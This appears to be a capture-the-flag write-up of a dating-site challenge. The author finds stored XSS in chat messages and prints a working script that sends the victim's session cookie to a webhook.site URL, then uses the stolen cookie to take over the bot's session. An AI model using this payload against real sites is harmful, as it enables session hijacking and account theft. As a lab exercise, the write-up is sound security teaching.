This is a website that asks for login credentials right away. Since I don't have
an account, I guess I have to register by clicking on the ~Sign Up Now~ button.

Be warned that you have to actually fill all the fields, including uploading an
image. If you don't, a non-sensical error will occur and you will have to write
it all over again. In my case, I just put random data, except my username. After
registering, you will be presented with an interface that shows you a person and
you have to click on the cross or the heart. I assume the cross is to ignore,
and the heart is to match with the person. I clicked on the heart for everyone,
regardless. After that, I went to the ~Matches~ and I was presented with a message
from Renata. I did spend some time talking to "her", because I was testing if it
was some kind of AI or just some script sending messages from a set number of
messages. It seems it was an AI, because it did react to thing I said, although
it was a bit repetitive, always asking for donations... makes sense though!

This being a user input... can I send HTML? Let's try something like ~This is
<b>bold</b> and this is <i>italic</i>.~:

So it's seems I can inject HTML. I tried something like
~<script>alert(1);</script>~ and it also works! Since users do have a session
cookie, I guess this could be an opportunity to hijack Renata's session. To do
this, I will use [[http://webhook.site/]] to inject ~Javascript~ to get the cookie, like this:

#+BEGIN_SRC html
<script type=“text/javascript”>
  document.location="https://webhook.site/4e02f6ce-2e64-4ab5-86a0-b529ded6e6db/?c="+document.cookie;
</script>
#+END_SRC

And it was successful! After that, I just copied the session cookie, replaced it
using the browser developer tools and refreshed the page. You can see that now I
am in Renata's session, talking to myself.

Also, the flag is in another conversation with other user! :-)
